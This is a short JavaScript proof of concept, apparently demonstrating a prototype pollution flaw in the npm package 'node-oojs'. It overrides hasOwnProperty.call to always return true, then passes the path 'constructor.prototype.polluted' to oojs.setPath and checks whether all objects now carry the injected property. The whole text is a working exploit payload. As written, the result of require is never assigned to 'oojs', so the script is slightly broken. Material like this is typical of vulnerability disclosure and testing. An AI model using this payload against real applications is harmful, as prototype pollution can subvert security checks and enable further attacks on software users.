Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
require('node-oojs');
oojs.setPath({ 'constructor.prototype.polluted': 'yes' });
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}